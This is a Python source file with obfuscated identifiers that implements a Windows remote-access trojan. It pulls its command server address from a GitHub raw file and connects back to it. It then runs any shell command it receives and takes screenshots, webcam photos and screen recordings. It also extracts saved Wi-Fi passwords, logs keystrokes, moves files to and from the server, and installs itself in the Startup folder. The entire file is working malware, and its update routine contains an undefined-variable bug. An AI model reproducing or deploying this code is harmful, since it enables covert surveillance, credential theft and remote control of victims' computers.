import urllib.request,subprocess,socket,time,os,json,base64,shutil,re
from datetime import datetime
fokSyzOGss = ""
WQZMDQfXMTXmsyPMiLyA = ""
gfUXizWTMFKQUNOMZSGp = "02.06.26.0"
SELvZfuApuDSzCufJI = True
IowLlPCzJbCkZuPx = "!"
YCylGPCCa = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
gcbKbalE = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
exQXqQqpxDUANW = os.path.expanduser("~\\AppData\\Local\\")
UmwzJLWXoVOygVz = os.path.expanduser("~\\AppData\\Roaming\\")
YTJxfwLdnDXyLhhAlEVd = ""
def HJAhdUm(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def ygSPZuUlDzwrHvCR(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	LPbWTZrFbqtMnNJsA = data.decode("utf-8").replace("\n","")
	if not LPbWTZrFbqtMnNJsA.startswith(IowLlPCzJbCkZuPx):
		proc = subprocess.run(LPbWTZrFbqtMnNJsA, shell=True, capture_output=True)
		XfCaMDiA = proc.stdout + proc.stderr
		xucsXHfFUSSdC(s, XfCaMDiA)
		return
	tIegNvgv = LPbWTZrFbqtMnNJsA.split(" ")[0][1:]
	args = " ".join(LPbWTZrFbqtMnNJsA.split()[1:]).split()
	if tIegNvgv == "cd":
		moveDirectory(s, LPbWTZrFbqtMnNJsA[4:])
	elif tIegNvgv == "screenshot":
		RlVmDheeYQ(s)
	elif tIegNvgv == "webcam":
		iaEpjoUL(s, args)
	elif tIegNvgv == "download":
		LXwvzHVEb(s, LPbWTZrFbqtMnNJsA)
	elif tIegNvgv == "upload":
		tpVSyUbejjBfSYLLqWv(s, LPbWTZrFbqtMnNJsA)
	elif tIegNvgv == "wifi":
		fGrRulvm(s)
	elif tIegNvgv == "screenrecord":
		dVpcLMpofOZv(s, args)
	elif tIegNvgv == "update":
		jsVPcsfLCUqqoXb(s)
	elif tIegNvgv == "basename":
		xucsXHfFUSSdC(s, os.path.basename(__file__))
	else:
		xucsXHfFUSSdC(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		xucsXHfFUSSdC(s,"")
	except:
		xucsXHfFUSSdC(s, "[!] 404")
def LXwvzHVEb(s, LPbWTZrFbqtMnNJsA):
	jDCbLAUdXPLmhJBNYzdtC = LPbWTZrFbqtMnNJsA.replace(IowLlPCzJbCkZuPx+"download ","").split(",")
	XfCaMDiAs = ""
	for f in jDCbLAUdXPLmhJBNYzdtC:
		XfCaMDiAs += ZNZgkrThtQ(f, "api/file/", { "type":os.path.splitext(f)[1] })
	xucsXHfFUSSdC(s, XfCaMDiAs)
def RlVmDheeYQ(s):
	from PIL import ImageGrab
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	itBMtQn = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(itBMtQn)
	image.close()
	XfCaMDiA = ZNZgkrThtQ(itBMtQn, "api/sscap")
	os.remove(itBMtQn)
	xucsXHfFUSSdC(s, XfCaMDiA)
def iaEpjoUL(s, args):
	import cv2
	cameraNumber = 0
	fname = "wc.jpg"
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = cv2.VideoCapture(cameraNumber)
		_, frame = cam.read()
		cv2.imwrite(exQXqQqpxDUANW+fname, frame)
		cam.release()
		r=ZNZgkrThtQ(exQXqQqpxDUANW+fname,"api/wc")
		os.remove(exQXqQqpxDUANW+fname)
		xucsXHfFUSSdC(s, r)
	except Exception as e:
		xucsXHfFUSSdC(s, "[!] 404: "+str(e))
def dVpcLMpofOZv(s, args):
	import imageio
	from PIL import ImageGrab
	rSYCsEzqzjQr = 15
	if not args == []:
		try: rSYCsEzqzjQr = int(args[0])
		except: pass
	ChghLPrzVMmTXJopdKccTI = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	ovnIsaKUgRvsyTYTkgs = []
	fps = 11
	numFrames = rSYCsEzqzjQr * fps
	for _ in range(numFrames):
		ovnIsaKUgRvsyTYTkgs.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(ChghLPrzVMmTXJopdKccTI, ovnIsaKUgRvsyTYTkgs, fps=fps, quality=8)
	r=ZNZgkrThtQ(ChghLPrzVMmTXJopdKccTI, "api/screc")
	os.remove(ChghLPrzVMmTXJopdKccTI)
	xucsXHfFUSSdC(s, r)
def ZNZgkrThtQ(frVNGfcOp, jNEdcCofia, FCWDryhWCtfo=None):
	import requests
	if not os.path.isfile(frVNGfcOp):
		return "[!] 404: "+frVNGfcOp+"\n"
	headers = {"user":os.getlogin()}
	if FCWDryhWCtfo is not None:
		headers = {**headers, **FCWDryhWCtfo}
	f = open(frVNGfcOp, "rb")
	requests.post("http://"+fokSyzOGss+":5555/"+jNEdcCofia,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def tpVSyUbejjBfSYLLqWv(s, LPbWTZrFbqtMnNJsA):
	import requests
	qOTYMocZFhiivuwIwp = LPbWTZrFbqtMnNJsA.split(" ")[-1]
	OJBPAEIlAnyywkB = LPbWTZrFbqtMnNJsA.replace(IowLlPCzJbCkZuPx+"upload ","").replace(" "+qOTYMocZFhiivuwIwp,"")
	if os.path.exists(OJBPAEIlAnyywkB) or os.path.isfile(OJBPAEIlAnyywkB):
		xucsXHfFUSSdC(s, "[!] 409")
		return
	response = requests.get(f"http://{fokSyzOGss}:5555/api/content/{qOTYMocZFhiivuwIwp}", headers={"auth":"981xyz"})
	if response.status_code != 200:
		xucsXHfFUSSdC(s, "[!] 404")
		return
	with open(OJBPAEIlAnyywkB, "wb") as f:
		f.write(response.content)
	xucsXHfFUSSdC(s, "[+] 200")
def NyRpCRFTqhVVUkJUnthRq(dCsfeRJCKclduMsfez, jNEdcCofia):
	import requests
	if dCsfeRJCKclduMsfez.strip() == "":
		return "[!] 204"
	requests.post("http://"+fokSyzOGss+":5555/"+jNEdcCofia,
		data=dCsfeRJCKclduMsfez,
		headers={"user":os.getlogin()})
	return "[+] 200"
def jsVPcsfLCUqqoXb(s):
	h, p, v = XAtWTZCQuxUnYFRTZ(True)
	if (v != gfUXizWTMFKQUNOMZSGp):
		XxAmfHTqqakHsAniUqUJe(v)
		xucsXHfFUSSdC(s, "[+] 200")
	else:
		xucsXHfFUSSdC(s, "[-] 304")
def fGrRulvm(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		xucsXHfFUSSdC(s, "[!] 500")
		return
	FIyUuNzybJWgY = ""
	for p in profiles:
		try: FIyUuNzybJWgY+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: FIyUuNzybJWgY+=f"    {p} - N/A"
	xucsXHfFUSSdC(s, FIyUuNzybJWgY)
def XxAmfHTqqakHsAniUqUJe(RmJsYElNZBsTLH):
	import requests, sys
	global SELvZfuApuDSzCufJI
	name, ext = os.path.splitext(os.path.basename(sys.executable if getattr(sys, "frozen", False) else __file__))
	py = ext.startswith(".py")
	file = f"{name}.{RmJsYElNZBsTLH}.{'pyw' if py else 'exe'}"
	course = f"file.{'pyw' if py else 'exe'}"
	path = os.path.join(os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"), file)
	if not os.path.isfile(path):
		r = requests.get(gcbKbalE + source)
		with open(path, "w" if py else "wb") as f:
			f.write(r.text if py else r.content)
	else:
		SELvZfuApuDSzCufJI = False
def XAtWTZCQuxUnYFRTZ(force=False):
	global fokSyzOGss, WQZMDQfXMTXmsyPMiLyA
	if force or fokSyzOGss == "" or WQZMDQfXMTXmsyPMiLyA == "":
		while True:
			try:
				with urllib.request.urlopen(YCylGPCCa) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					fokSyzOGss = data[0].strip()
					WQZMDQfXMTXmsyPMiLyA = data[1].strip()
					RmJsYElNZBsTLH = data[2].strip()
					return fokSyzOGss, WQZMDQfXMTXmsyPMiLyA, RmJsYElNZBsTLH
			except:
				time.sleep(10)
def ngkkNGUbJZTe():
	try:
		KPlsImMxWsinEcn = "settings.xpb"
		ZffBdxBqygdLRAvaId = sorted([file for file in os.listdir(exQXqQqpxDUANW) if os.path.isfile(exQXqQqpxDUANW+"\\"+file) and file.endswith(KPlsImMxWsinEcn.split(".")[-1])])
		if KPlsImMxWsinEcn in ZffBdxBqygdLRAvaId:
			ZffBdxBqygdLRAvaId.remove(KPlsImMxWsinEcn)
		fSjpbJppTJOhFoOcYXNcE = os.path.join(exQXqQqpxDUANW,KPlsImMxWsinEcn)
		if len(ZffBdxBqygdLRAvaId) > 0:
			with open(fSjpbJppTJOhFoOcYXNcE, "ab+") as f:
				for file in ZffBdxBqygdLRAvaId:
					temp = os.path.join(exQXqQqpxDUANW,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		ZNZgkrThtQ(fSjpbJppTJOhFoOcYXNcE, "api/log")
		if os.path.isfile(fSjpbJppTJOhFoOcYXNcE):
			os.remove(fSjpbJppTJOhFoOcYXNcE)
	except:
		pass
def comAKXecSwQSIooXAXRf():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(exQXqQqpxDUANW+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def JOMyWYDtjmB(k):
		logging.info(str(k))
	k=Listener(on_press=JOMyWYDtjmB)
	gxUPQfXNzO = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in gxUPQfXNzO:
		l.setLevel(logging.CRITICAL)
	k.start()
def xucsXHfFUSSdC(clientSocket, dCsfeRJCKclduMsfez):
	formattedData = b""
	if type(dCsfeRJCKclduMsfez) == bytes:
		formattedData += dCsfeRJCKclduMsfez
	else:
		formattedData += bytes(dCsfeRJCKclduMsfez, "utf-8")
	formattedData += bytes("\n"+YTJxfwLdnDXyLhhAlEVd+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def nwfvcCwSzotg():
	global YTJxfwLdnDXyLhhAlEVd
	h, p, v = XAtWTZCQuxUnYFRTZ()
	try: ngkkNGUbJZTe()
	except: pass
	try:
		if gfUXizWTMFKQUNOMZSGp != v:
			XxAmfHTqqakHsAniUqUJe(v)
	except: pass
	try:
		if SELvZfuApuDSzCufJI:
			comAKXecSwQSIooXAXRf()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	YTJxfwLdnDXyLhhAlEVd = ("(old)"if gfUXizWTMFKQUNOMZSGp!=v else "")+"["+gfUXizWTMFKQUNOMZSGp+"] "+os.getlogin()+" - "
	while True:
		BOWSzJDxMkTDfhMKcqY=False
		try:
			s=HJAhdUm(h, p)
			xucsXHfFUSSdC(s, "")
			while not BOWSzJDxMkTDfhMKcqY:
				try: BOWSzJDxMkTDfhMKcqY=ygSPZuUlDzwrHvCR(s)
				except Exception as e:
					xucsXHfFUSSdC(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
nwfvcCwSzotg()
